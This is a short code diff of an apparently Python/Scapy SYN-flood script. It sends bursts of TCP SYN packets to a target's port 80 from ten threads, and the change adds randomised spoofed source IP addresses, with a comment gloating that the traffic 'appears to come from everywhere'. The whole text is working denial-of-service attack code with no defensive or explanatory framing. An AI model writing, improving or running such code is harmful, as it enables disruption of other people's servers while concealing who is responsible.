@@ -10,7 +10,9 @@ port = 80
 
 def flood():
 	for x in range(100):
-		send(IP(dst=target)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
+		#so it appears to come from everywhere :D
+		culprits = "%i.%i.%i.%i"%(random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
+		send(IP(dst=target, src=culprits)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
 		
 for i in range(10):
 	thread.Thread(target=flood).start()
